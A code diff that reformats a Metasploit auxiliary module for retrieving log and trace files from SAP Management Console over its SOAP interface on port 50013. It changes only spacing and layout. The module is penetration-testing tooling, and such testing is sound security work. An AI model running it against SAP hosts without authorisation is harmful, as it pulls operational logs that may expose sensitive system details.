@@ -10,41 +10,40 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'SAP Management Console Get Logfile',
-      'Description'  => %q{
+      'Name' => 'SAP Management Console Get Logfile',
+      'Description' => %q{
         This module simply attempts to download available logfiles and
         developer tracefiles through the SAP Management Console SOAP
         Interface. Please use the sap_mgmt_con_listlogfiles
         extension to view a list of available files.
         },
-      'References'   =>
-        [
-          # General
-          [ 'URL', 'http://blog.c22.cc' ]
-        ],
-      'Author'       =>
-        [	'Chris John Riley', # original msf module
-          'Bruno Morisson <bm[at]integrity.pt>' # bulk file retrieval
-        ],
-      'License'      => MSF_LICENSE
+      'References' => [
+        # General
+        [ 'URL', 'http://blog.c22.cc' ]
+      ],
+      'Author' => [
+        'Chris John Riley', # original msf module
+        'Bruno Morisson <bm[at]integrity.pt>'
+      ], # bulk file retrieval
+      'License' => MSF_LICENSE
     )
-
 
     register_options(
       [
         Opt::RPORT(50013),
         OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
         OptString.new('RFILE', [ true, 'The name of the file to download ', 'sapstart.log']),
-        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE','LOGFILE']]),
+        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE', 'LOGFILE']]),
         OptBool.new('GETALL', [ false, 'Download all available files (WARNING: may take a long time!)', false])
-      ])
+      ]
+    )
     register_autofilter_ports([ 50013 ])
   end
 
   def run_host(ip)
     res = send_request_cgi({
-      'uri'      => normalize_uri(datastore['URI']),
-      'method'   => 'GET'
+      'uri' => normalize_uri(datastore['URI']),
+      'method' => 'GET'
     }, 25)
 
     if not res
@@ -54,9 +53,8 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['GETALL']
       listfiles(ip)
     else
-      gettfiles(rhost,"#{datastore['RFILE']}",'')
+      gettfiles(rhost, "#{datastore['RFILE']}", '')
     end
-
   end
 
   def listfiles(rhost)
@@ -91,14 +89,14 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'uri'      => normalize_uri(datastore['URI']),
-        'method'   => 'POST',
-        'data'     => data,
-        'headers'  =>
+        'uri' => normalize_uri(datastore['URI']),
+        'method' => 'POST',
+        'data' => data,
+        'headers' =>
           {
             'Content-Length' => data.length,
-            'SOAPAction'     => '""',
-            'Content-Type'   => 'text/xml; charset=UTF-8',
+            'SOAPAction' => '""',
+            'Content-Type' => 'text/xml; charset=UTF-8',
           }
       }, 30)
 
@@ -118,7 +116,6 @@ class MetasploitModule < Msf::Auxiliary
           fault = true
         end
       end
-
     rescue ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
       return
@@ -128,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}: #{env.length} files available")
 
       env.each do |output|
-        gettfiles(rhost,output[0],output[1])
+        gettfiles(rhost, output[0], output[1])
       end
 
       return
@@ -143,7 +140,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def gettfiles(rhost,logfile,filelen)
+  def gettfiles(rhost, logfile, filelen)
     if filelen
       print_status("#{rhost}:#{rport} [SAP] Attempting to retrieve file #{logfile} (#{filelen} bytes)")
     else
@@ -180,14 +177,14 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'uri'      => normalize_uri(datastore['URI']),
-        'method'   => 'POST',
-        'data'     => data,
-        'headers'  =>
+        'uri' => normalize_uri(datastore['URI']),
+        'method' => 'POST',
+        'data' => data,
+        'headers' =>
           {
             'Content-Length' => data.length,
-            'SOAPAction'     => '""',
-            'Content-Type'   => 'text/xml; charset=UTF-8',
+            'SOAPAction' => '""',
+            'Content-Type' => 'text/xml; charset=UTF-8',
           }
       }, 120)
 
@@ -215,7 +212,6 @@ class MetasploitModule < Msf::Auxiliary
           fault = true
         end
       end
-
     rescue ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} [SAP] Unable to connect")
       return
